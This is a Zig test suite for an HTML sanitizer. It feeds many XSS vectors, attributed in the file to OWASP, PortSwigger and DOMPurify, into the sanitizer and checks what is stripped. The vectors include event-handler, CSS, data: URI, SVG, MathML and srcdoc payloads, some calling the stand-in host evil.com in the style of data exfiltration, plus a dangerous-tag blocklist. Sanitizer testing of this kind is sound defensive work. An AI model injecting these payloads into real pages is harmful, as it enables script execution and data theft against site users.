        .threat_html = "<style>@keyframes x{from{left:0;}to{left:1000px;}}</style><xss id=x style=\"position:absolute;\" onanimationcancel=\"print()\"></xss>",
        .should_not_contain = &.{"onanimationcancel"},
    },

    // --- Media Events ---
    .{
        .name = "PS: oncanplay on audio",
        .threat_html = "<audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
        .should_not_contain = &.{"oncanplay"},
    },
    .{
        .name = "PS: oncanplaythrough on video",
        .threat_html = "<video oncanplaythrough=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>",
        .should_not_contain = &.{"oncanplaythrough"},
    },
    .{
        .name = "PS: ondurationchange on audio",
        .threat_html = "<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
        .should_not_contain = &.{"ondurationchange"},
    },
    .{
        .name = "PS: onended on audio",
        .threat_html = "<audio controls autoplay onended=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
        .should_not_contain = &.{"onended"},
    },
    .{
        .name = "PS: onloadeddata on audio",
        .threat_html = "<audio onloadeddata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
        .should_not_contain = &.{"onloadeddata"},
    },
    .{
        .name = "PS: onloadedmetadata on audio",
        .threat_html = "<audio autoplay onloadedmetadata=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
        .should_not_contain = &.{"onloadedmetadata"},
    },
    .{
        .name = "PS: onloadstart on video",
        .threat_html = "<video onloadstart=\"alert(1)\"><source></video>",
        .should_not_contain = &.{"onloadstart"},
    },
    .{
        .name = "PS: onplay on audio",
        .threat_html = "<audio autoplay onplay=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
        .should_not_contain = &.{"onplay="},
    },
    .{
        .name = "PS: onplaying on audio",
        .threat_html = "<audio autoplay onplaying=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
        .should_not_contain = &.{"onplaying"},
    },
    .{
        .name = "PS: onprogress on audio",
        .threat_html = "<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
        .should_not_contain = &.{"onprogress"},
    },
    .{
        .name = "PS: onsuspend on audio",
        .threat_html = "<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
        .should_not_contain = &.{"onsuspend"},
    },
    .{
        .name = "PS: ontimeupdate on audio",
        .threat_html = "<audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>",
        .should_not_contain = &.{"ontimeupdate"},
    },
    .{
        .name = "PS: onerror on audio (minimal src/)",
        .threat_html = "<audio src/onerror=alert(1)>",
        .should_not_contain = &.{"onerror"},
    },

    // --- Focus Events ---
    .{
        .name = "PS: onfocus with tabindex",
        .threat_html = "<a id=x tabindex=1 onfocus=alert(1)></a>",
        .should_not_contain = &.{"onfocus"},
    },
    .{
        .name = "PS: onfocus with autofocus on custom tag",
        .threat_html = "<xss onfocus=alert(1) autofocus tabindex=1>",
        .should_not_contain = &.{"onfocus"},
    },
    .{
        .name = "PS: onfocusin on anchor",
        .threat_html = "<a id=x tabindex=1 onfocusin=alert(1)></a>",
        .should_not_contain = &.{"onfocusin"},
    },

    // --- Page/Window Events ---
    .{
        .name = "PS: onhashchange on body",
        .threat_html = "<body onhashchange=\"print()\">",
        .should_not_contain = &.{"onhashchange"},
    },
    .{
        .name = "PS: onmessage on body",
        .threat_html = "<body onmessage=print()>",
        .should_not_contain = &.{"onmessage"},
    },
    .{
        .name = "PS: onpageshow on body",
        .threat_html = "<body onpageshow=alert(1)>",
        .should_not_contain = &.{"onpageshow"},
    },
    .{
        .name = "PS: onpopstate on body",
        .threat_html = "<body onpopstate=print()>",
        .should_not_contain = &.{"onpopstate"},
    },
    .{
        .name = "PS: onresize on body",
        .threat_html = "<body onresize=\"print()\">",
        .should_not_contain = &.{"onresize"},
    },
    .{
        .name = "PS: onscroll on body with tall div",
        .threat_html = "<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>",
        .should_not_contain = &.{"onscroll="},
    },
    .{
        .name = "PS: onbeforeprint on body",
        .threat_html = "<body onbeforeprint=console.log(1)>",
        .should_not_contain = &.{"onbeforeprint"},
    },
    .{
        .name = "PS: onbeforeunload on body",
        .threat_html = "<body onbeforeunload=alert(1)>",
        .should_not_contain = &.{"onbeforeunload"},
    },
    .{
        .name = "PS: onunload on body",
        .threat_html = "<body onunload=alert(1)>",
        .should_not_contain = &.{"onunload"},
    },
    .{
        .name = "PS: onafterprint on body",
        .threat_html = "<body onafterprint=alert(1)>",
        .should_not_contain = &.{"onafterprint"},
    },
    .{
        .name = "PS: onpagereveal on body",
        .threat_html = "<body onpagereveal=alert(1)>",
        .should_not_contain = &.{"onpagereveal"},
    },

    // --- SVG Animation Events ---
    .{
        .name = "PS: onbegin on SVG animate",
        .threat_html = "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        .should_not_contain = &.{"onbegin"},
    },
    .{
        .name = "PS: onend on SVG animate",
        .threat_html = "<svg><animate onend=alert(1) attributeName=x dur=1s>",
        .should_not_contain = &.{"onend"},
    },
    .{
        .name = "PS: onrepeat on SVG animate",
        .threat_html = "<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />",
        .should_not_contain = &.{"onrepeat"},
    },

    // --- CSS Transition Events ---
    .{
        .name = "PS: ontransitionend on custom tag",
        .threat_html = "<xss id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1></xss>",
        .should_not_contain = &.{"ontransitionend"},
    },
    .{
        .name = "PS: ontransitionstart on custom tag",
        .threat_html = "<style>:target{color:red;}</style><xss id=x style=\"transition:color 1s\" ontransitionstart=alert(1)></xss>",
        .should_not_contain = &.{"ontransitionstart"},
    },

    // --- HTML5 Interaction Events ---
    .{
        .name = "PS: ontoggle on details (open)",
        .threat_html = "<details ontoggle=alert(1) open>test</details>",
        .should_not_contain = &.{"ontoggle"},
    },
    .{
        .name = "PS: oncontentvisibilityautostatechange",
        .threat_html = "<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>",
        .should_not_contain = &.{"oncontentvisibilityautostatechange"},
    },
    .{
        .name = "PS: onsecuritypolicyviolation on custom tag",
        .threat_html = "<xss onsecuritypolicyviolation=alert(1)>XSS</xss>",
        .should_not_contain = &.{"onsecuritypolicyviolation"},
    },
    .{
        .name = "PS: onscrollend on custom tag",
        .threat_html = "<xss onscrollend=alert(1) style=\"display:block;overflow:auto;\"><br><br><br><span id=x>test</span></xss>",
        .should_not_contain = &.{"onscrollend"},
    },
    .{
        .name = "PS: onslotchange via template shadow root",
        .threat_html = "x<template shadowrootmode=open><slot onslotchange=alert(1)>",
        .should_not_contain = &.{"onslotchange"},
    },
    .{
        .name = "PS: onbeforematch with hidden-until-found",
        .threat_html = "<xss id=x onbeforematch=alert(1) hidden=until-found>",
        .should_not_contain = &.{"onbeforematch"},
    },
    .{
        .name = "PS: onbeforetoggle with popover",
        .threat_html = "<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>",
        .should_not_contain = &.{"onbeforetoggle"},
    },

    // --- Click/Pointer Events ---
    .{
        .name = "PS: onclick on custom tag",
        .threat_html = "<xss onclick=\"alert(1)\" style=display:block>test</xss>",
        .should_not_contain = &.{"onclick"},
    },
    .{
        .name = "PS: ondblclick on custom tag",
        .threat_html = "<xss ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test</xss>",
        .should_not_contain = &.{"ondblclick"},
    },
    .{
        .name = "PS: onauxclick on input",
        .threat_html = "<input onauxclick=alert(1)>",
        .should_not_contain = &.{"onauxclick"},
    },
    .{
        .name = "PS: oncontextmenu on custom tag",
        .threat_html = "<xss oncontextmenu=\"alert(1)\" style=display:block>test</xss>",
        .should_not_contain = &.{"oncontextmenu"},
    },

    // --- Drag Events ---
    .{
        .name = "PS: ondrag on custom tag",
        .threat_html = "<xss draggable=\"true\" ondrag=\"alert(1)\" style=display:block>test</xss>",
        .should_not_contain = &.{"ondrag="},
    },
    .{
        .name = "PS: ondragend on custom tag",
        .threat_html = "<xss draggable=\"true\" ondragend=\"alert(1)\" style=display:block>test</xss>",
        .should_not_contain = &.{"ondragend"},
    },
    .{
        .name = "PS: ondragenter on custom tag",
        .threat_html = "<xss draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>test</xss>",
        .should_not_contain = &.{"ondragenter"},
    },

    // --- Form/Input Events ---
    .{
        .name = "PS: onchange on input",
        .threat_html = "<input onchange=alert(1) value=xss>",
        .should_not_contain = &.{"onchange"},
    },
    .{
        .name = "PS: oncancel on file input",
        .threat_html = "<input type=file oncancel=alert(1)>",
        .should_not_contain = &.{"oncancel"},
    },
    .{
        .name = "PS: onclose on dialog",
        .threat_html = "<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form></dialog>",
        .should_not_contain = &.{"onclose"},
    },
    .{
        .name = "PS: oninvalid on input (required)",
        .threat_html = "<form><input oninvalid=alert(1) required><input type=submit>",
        .should_not_contain = &.{"oninvalid"},
    },
    .{
        .name = "PS: oninput on input",
        .threat_html = "<input oninput=alert(1) autofocus>",
        .should_not_contain = &.{"oninput"},
    },
    .{
        .name = "PS: onselect on textarea",
        .threat_html = "<textarea onselect=alert(1)>test</textarea>",
        .should_not_contain = &.{"onselect"},
    },

    // --- Clipboard Events ---
    .{
        .name = "PS: onbeforecopy on contenteditable",
        .threat_html = "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>",
        .should_not_contain = &.{"onbeforecopy"},
    },
    .{
        .name = "PS: onbeforecut on contenteditable",
        .threat_html = "<a onbeforecut=\"alert(1)\" contenteditable>test</a>",
        .should_not_contain = &.{"onbeforecut"},
    },
    .{
        .name = "PS: onbeforeinput on contenteditable",
        .threat_html = "<xss contenteditable onbeforeinput=alert(1)>test",
        .should_not_contain = &.{"onbeforeinput"},
    },
    .{
        .name = "PS: oncopy on custom tag",
        .threat_html = "<xss oncopy=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test",
        .should_not_contain = &.{"oncopy"},
    },
    .{
        .name = "PS: oncut on custom tag",
        .threat_html = "<xss oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test",
        .should_not_contain = &.{"oncut"},
    },
    .{
        .name = "PS: onpaste on custom tag",
        .threat_html = "<xss onpaste=alert(1)>XSS</xss>",
        .should_not_contain = &.{"onpaste"},
    },

    // --- Blur ---
    .{
        .name = "PS: onblur on custom tag",
        .threat_html = "<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>",
        .should_not_contain = &.{"onblur"},
    },

    // --- Wheel/Pointer ---
    .{
        .name = "PS: onwheel on div",
        .threat_html = "<div onwheel=alert(1) style=\"height:1000px\">scroll here</div>",
        .should_not_contain = &.{"onwheel"},
    },
    .{
        .name = "PS: onpointerdown on custom tag",
        .threat_html = "<xss onpointerdown=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onpointerdown"},
    },
    .{
        .name = "PS: onpointerup on custom tag",
        .threat_html = "<xss onpointerup=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onpointerup"},
    },
    .{
        .name = "PS: onpointermove on custom tag",
        .threat_html = "<xss onpointermove=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onpointermove"},
    },

    // --- Mouse Events ---
    .{
        .name = "PS: onmousedown on custom tag",
        .threat_html = "<xss onmousedown=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onmousedown"},
    },
    .{
        .name = "PS: onmouseup on custom tag",
        .threat_html = "<xss onmouseup=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onmouseup"},
    },
    .{
        .name = "PS: onmousemove on custom tag",
        .threat_html = "<xss onmousemove=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onmousemove"},
    },
    .{
        .name = "PS: onmouseout on custom tag",
        .threat_html = "<xss onmouseout=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onmouseout"},
    },
    .{
        .name = "PS: onmouseenter on custom tag",
        .threat_html = "<xss onmouseenter=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onmouseenter"},
    },
    .{
        .name = "PS: onmouseleave on custom tag",
        .threat_html = "<xss onmouseleave=alert(1) style=display:block>test</xss>",
        .should_not_contain = &.{"onmouseleave"},
    },

    // --- Keyboard Events ---
    .{
        .name = "PS: onkeydown on input",
        .threat_html = "<input onkeydown=alert(1) autofocus>",
        .should_not_contain = &.{"onkeydown"},
    },
    .{
        .name = "PS: onkeypress on input",
        .threat_html = "<input onkeypress=alert(1) autofocus>",
        .should_not_contain = &.{"onkeypress"},
    },
    .{
        .name = "PS: onkeyup on input",
        .threat_html = "<input onkeyup=alert(1) autofocus>",
        .should_not_contain = &.{"onkeyup"},
    },

    // --- Touch Events ---
    .{
        .name = "PS: ontouchstart on div",
        .threat_html = "<div ontouchstart=alert(1)>touch</div>",
        .should_not_contain = &.{"ontouchstart"},
    },
    .{
        .name = "PS: ontouchend on div",
        .threat_html = "<div ontouchend=alert(1)>touch</div>",
        .should_not_contain = &.{"ontouchend"},
    },
    .{
        .name = "PS: ontouchmove on div",
        .threat_html = "<div ontouchmove=alert(1)>touch</div>",
        .should_not_contain = &.{"ontouchmove"},
    },
};

// ============================================================================
// CSS Injection & Style-Based Attack Vectors
// Additional CSS-specific attacks from OWASP and PortSwigger
// ============================================================================

const CSS_INJECTION_VECTORS = [_]TestCase{
    // --- CSS expression() variants ---
    .{
        .name = "CSS: expression() in inline style with comment obfuscation",
        .threat_html = "<div style=\"width: expr/**/ession(alert('XSS'));\">test</div>",
        .should_not_contain = &.{"expression"},
        .should_contain = &.{"test"},
    },
    .{
        .name = "CSS: expression() with mixed case",
        .threat_html = "<div style=\"width: ExPrEsSiOn(alert('XSS'));\">test</div>",
        .should_not_contain = &.{"expression"},
        .should_contain = &.{"test"},
    },

    // --- CSS url() with dangerous protocols ---
    .{
        .name = "CSS: background url(javascript:) in inline style",
        .threat_html = "<div style=\"background: url(javascript:alert('XSS'))\">test</div>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"test"},
    },
    .{
        .name = "CSS: list-style url(javascript:) in inline style",
        .threat_html = "<ul><li style=\"list-style: url(javascript:alert('XSS'))\">item</li></ul>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"item"},
    },
    .{
        .name = "CSS: background-image url(data:text/html) in inline style",
        .threat_html = "<div style=\"background-image: url(data:text/html,<script>alert(1)</script>)\">test</div>",
        .should_not_contain = &.{"data:text/html"},
        .should_contain = &.{"test"},
    },

    // --- CSS @import and @charset ---
    .{
        .name = "CSS: @charset in style tag",
        .threat_html = "<style>@charset \"UTF-7\";</style>",
        .should_not_contain = &.{"@charset"},
    },
    .{
        .name = "CSS: @namespace in style tag",
        .threat_html = "<style>@namespace url(http://evil.com/);</style>",
        .should_not_contain = &.{"@namespace"},
    },

    // --- Dangerous CSS properties ---
    .{
        .name = "CSS: -webkit-user-modify in inline style",
        .threat_html = "<div style=\"-webkit-user-modify: read-write\">test</div>",
        .should_not_contain = &.{"-webkit-user-modify"},
        .should_contain = &.{"test"},
    },
    .{
        .name = "CSS: filter with progid (IE) in inline style",
        .threat_html = "<div style=\"filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=50)\">test</div>",
        .should_not_contain = &.{"progid"},
        .should_contain = &.{"test"},
    },
    .{
        .name = "CSS: -o-link in inline style (Opera)",
        .threat_html = "<div style=\"-o-link: 'javascript:alert(1)'; -o-link-source: current\">test</div>",
        .should_not_contain = &.{"-o-link"},
        .should_contain = &.{"test"},
    },

    // --- CSS data exfiltration patterns ---
    .{
        .name = "CSS: background url to external server (data exfil)",
        .threat_html = "<div style=\"background: url('http://evil.com/steal?data=secret')\">test</div>",
        .should_not_contain = &.{"evil.com"},
        .should_contain = &.{"test"},
    },
};

// ============================================================================
// OWASP HTML5 Security & DOM-Based XSS Vectors
// From HTML5 Security Cheat Sheet and DOM-based XSS Prevention
// ============================================================================

const HTML5_SECURITY_VECTORS = [_]TestCase{
    // --- HTML5 semantic elements with event handlers ---
    .{
        .name = "HTML5: details/summary with ontoggle",
        .threat_html = "<details open ontoggle=alert(1)><summary>Click</summary>Content</details>",
        .should_not_contain = &.{"ontoggle"},
        .should_contain = &.{"Content"},
    },
    .{
        .name = "HTML5: dialog with onclose",
        .threat_html = "<dialog open onclose=alert(1)>Content</dialog>",
        .should_not_contain = &.{"onclose"},
    },
    .{
        .name = "HTML5: video poster with javascript:",
        .threat_html = "<video poster=\"javascript:alert(1)\"></video>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "HTML5: source tag with onerror",
        .threat_html = "<video><source onerror=\"alert(1)\"></video>",
        .should_not_contain = &.{"onerror"},
    },

    // --- data: URI attacks on various elements ---
    .{
        .name = "HTML5: a href data:text/html with script",
        .threat_html = "<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>",
        .should_not_contain = &.{"data:text/html"},
        .should_contain = &.{"Click"},
    },
    .{
        .name = "HTML5: a href data:text/html base64",
        .threat_html = "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Click</a>",
        .should_not_contain = &.{"data:text/html"},
        .should_contain = &.{"Click"},
    },
    .{
        .name = "HTML5: img src data:image/svg+xml with script",
        .threat_html = "<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">",
        .should_not_contain = &.{"data:image/svg"},
    },

    // --- SVG within HTML5 ---
    .{
        .name = "HTML5: inline SVG with script tag",
        .threat_html = "<svg><script>alert(1)</script></svg>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "HTML5: inline SVG with foreignObject and script",
        .threat_html = "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "HTML5: inline SVG with use and external reference",
        .threat_html = "<svg><use href=\"http://evil.com/xss.svg#payload\"></use></svg>",
        .should_not_contain = &.{"evil.com"},
    },
    .{
        .name = "HTML5: SVG animate with onbegin",
        .threat_html = "<svg><animate onbegin=\"alert(1)\" attributeName=x dur=1s>",
        .should_not_contain = &.{"onbegin"},
    },
    .{
        .name = "HTML5: SVG set with onbegin",
        .threat_html = "<svg><set onbegin=\"alert(1)\" attributeName=x to=1>",
        .should_not_contain = &.{"onbegin"},
    },

    // --- MathML attacks ---
    .{
        .name = "HTML5: MathML with script",
        .threat_html = "<math><script>alert(1)</script></math>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "HTML5: MathML maction with onclick",
        .threat_html = "<math><maction actiontype=\"statusline\" onclick=\"alert(1)\">Click</maction></math>",
        .should_not_contain = &.{"onclick"},
    },

    // --- Template injection ---
    .{
        .name = "HTML5: template with script inside",
        .threat_html = "<template><script>alert(1)</script></template>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "HTML5: nested templates with img onerror",
        .threat_html = "<template><template><img src=x onerror=alert(1)></template></template>",
        .should_not_contain = &.{"onerror"},
    },

    // --- Dangerous HTML attributes (DOM-based XSS Prevention) ---
    .{
        .name = "HTML5: innerHTML attribute on element",
        .threat_html = "<div innerHTML=\"<script>alert(1)</script>\">safe</div>",
        .should_not_contain = &.{"innerHTML"},
        .should_contain = &.{"safe"},
    },
    .{
        .name = "HTML5: formaction with javascript: on button",
        .threat_html = "<form><button formaction=\"javascript:alert(1)\">Submit</button></form>",
        .should_not_contain = &.{"formaction"},
    },
    .{
        .name = "HTML5: autofocus onfocus combination",
        .threat_html = "<input autofocus onfocus=\"alert(1)\">",
        .should_not_contain = &.{"onfocus"},
    },

    // --- srcdoc / sandbox bypass ---
    .{
        .name = "HTML5: iframe srcdoc with script",
        .threat_html = "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        .should_not_contain = &.{"iframe"},
    },
};

// ============================================================================
// Test Entrypoints
// ============================================================================

/// Run all test cases in a suite. Returns error on first failure.
fn runSuite(comptime suite: []const TestCase) !void {
    for (suite) |tc| {
        try runTestCase(tc);
    }
}

test "sanitizer vectors: OWASP XSS Filter Evasion" {
    try runSuite(&OWASP_XSS_FILTER_EVASION);
}

test "sanitizer vectors: OWASP XSS Prevention" {
    try runSuite(&OWASP_XSS_PREVENTION);
}

test "sanitizer vectors: OWASP DOM Clobbering" {
    try runSuite(&OWASP_DOM_CLOBBERING);
}

test "sanitizer vectors: DOMPurify-derived" {
    try runSuite(&DOMPURIFY_DERIVED);
}

test "sanitizer vectors: OWASP encoding bypasses" {
    try runSuite(&OWASP_ENCODING_BYPASSES);
}

test "sanitizer vectors: PortSwigger event handlers" {
    try runSuite(&PORTSWIGGER_EVENT_HANDLERS);
}

test "sanitizer vectors: CSS injection" {
    try runSuite(&CSS_INJECTION_VECTORS);
}

test "sanitizer vectors: HTML5 security" {
    try runSuite(&HTML5_SECURITY_VECTORS);
}

// ============================================================================
// H5SC (HTML5 Security Cheatsheet) — DOM-level safety validation
// Uses the same structural approach as h5sc-test.zig: parse the HTML file,
// sanitize with CSS support, then verify each vector subtree is safe.
// ============================================================================

// Tags that should never appear in sanitized output
const H5SC_DANGEROUS_TAGS = [_][]const u8{ "script", "object", "embed", "applet", "meta", "xml", "iframe" };

/// Check if a DOM subtree is safe (no dangerous tags, no event handlers,
/// no javascript:/vbscript: URLs, no dangerous data: URLs).
fn isSafeSubtree(root: *z.DomNode) bool {
    if (!isNodeSafe(root)) return false;
    var child = z.firstChild(root);
    while (child) |c| : (child = z.nextSibling(c)) {
        if (!isSafeSubtree(c)) return false;
    }
    return true;
}

fn isNodeSafe(node: *z.DomNode) bool {
    const type_ = z.nodeType(node);
    if (type_ == .text or type_ == .comment) return true;

    if (type_ == .element) {
        const tag_name = z.nodeName_zc(node);

        // CHECK 1: Blacklisted tags
        for (H5SC_DANGEROUS_TAGS) |bad_tag| {
            if (std.ascii.eqlIgnoreCase(tag_name, bad_tag)) return false;
        }

        // CHECK 2: Dangerous attributes
        var attr = z.iterateDomAttributes(z.nodeToElement(node).?);
        while (attr.next()) |a| {
            const attr_name = z.getAttributeName_zc(a);
            const attr_val = z.getAttributeValue_zc(a);

            // Event handlers (on*)
            if (std.ascii.startsWithIgnoreCase(attr_name, "on")) return false;

            // javascript:/vbscript: in URL attributes
            if (std.ascii.eqlIgnoreCase(attr_name, "href") or
                std.ascii.eqlIgnoreCase(attr_name, "src") or
                std.ascii.eqlIgnoreCase(attr_name, "action") or
                std.ascii.eqlIgnoreCase(attr_name, "formaction") or
                std.ascii.eqlIgnoreCase(attr_name, "data") or
                std.ascii.eqlIgnoreCase(attr_name, "background") or
                std.ascii.eqlIgnoreCase(attr_name, "poster"))
            {
                if (containsProtocol(attr_val, "javascript:")) return false;
                if (containsProtocol(attr_val, "vbscript:")) return false;
                if (containsProtocol(attr_val, "data:")) {
                    if (containsProtocol(attr_val, "text/html")) return false;
                    if (containsProtocol(attr_val, "application/javascript")) return false;
                }
            }
        }
    }
    return true;
}

fn containsProtocol(value: []const u8, protocol: []const u8) bool {
    // Strip whitespace/control chars for obfuscation resistance (e.g. "j\navascript:")
    var clean_buf: [4096]u8 = undefined;
    var clean_len: usize = 0;
    for (value) |ch| {
        if (clean_len >= clean_buf.len) break;
        if (ch > 0x20 and ch != 0x7f) {
            clean_buf[clean_len] = std.ascii.toLower(ch);
            clean_len += 1;
        }
    }
    const clean = clean_buf[0..clean_len];

    if (clean.len < protocol.len) return false;
    for (0..(clean.len - protocol.len + 1)) |i| {
        if (std.mem.eql(u8, clean[i..][0..protocol.len], protocol)) return true;
    }
    return false;
}

test "sanitizer vectors: H5SC (HTML5 Security Cheatsheet)" {
    const allocator = testing.allocator;

    const html_content = @embedFile("../examples/sanitizer/h5sc-test.html");

    const doc = try z.parseHTML(allocator, html_content);
    defer z.destroyDocument(doc);

    // Sanitize with CSS support (matches h5sc-test.zig approach)
    var css_sanitizer = try z.CssSanitizer.init(allocator, .{});
    defer css_sanitizer.deinit();

    const custom_mode = z.SanitizerMode{
        .custom = z.SanitizerOptions{
            .skip_comments = true,
            .remove_scripts = true,
            .remove_styles = false,
            .sanitize_inline_styles = true,
            .strict_uri_validation = true,
            .allow_custom_elements = false,
            .allow_framework_attrs = true,
            .sanitize_dom_clobbering = true,
        },
    };

    const body_node = z.bodyNode(doc) orelse return error.TestUnexpectedResult;

    try z.sanitizeWithCss(allocator, body_node, custom_mode, &css_sanitizer);

    // Find all vector containers
    const vectors = try z.querySelectorAll(allocator, doc, "div.vector");
    defer allocator.free(vectors);

    var failed: usize = 0;
    for (vectors) |vector_div| {
        if (!isSafeSubtree(z.elementToNode(vector_div))) {
            const id_str = z.getAttribute_zc(vector_div, "data-id") orelse "unknown";
            std.debug.print("❌  FAIL H5SC Vector ID: {s}\n", .{id_str});
            failed += 1;
        }
    }

    std.debug.print("\n  H5SC: {d} passed, {d} failed (of {d} vectors)\n", .{
        vectors.len - failed, failed, vectors.len,
    });

    if (failed > 0) {
        return error.TestUnexpectedResult;
    }
}
